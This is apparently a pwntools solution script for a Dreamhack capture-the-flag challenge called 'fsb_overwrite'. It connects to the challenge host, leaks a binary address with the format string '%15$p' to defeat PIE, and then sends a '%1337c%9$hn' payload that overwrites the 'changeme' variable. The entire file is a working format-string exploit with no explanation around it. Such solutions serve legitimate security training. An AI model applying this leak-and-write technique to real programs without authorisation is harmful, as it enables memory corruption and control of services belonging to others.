from pwn import *

PORT =  11797
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./fsb_overwrite', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*main+76
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


fmt = b"%15$p|"

p.sendline(fmt)
exe_leak = int(p.recvuntil(b"|", drop = True), 16)
exe.address = exe_leak - 0x1293
log.info("exe_leak: " + hex(exe.address))

fmt =f"%{1337}c%9$hn".encode()

pl = flat(
	fmt.ljust(0x18, b"A"),
	exe.sym.changeme
	)


p.sendline(pl)
p.interactive()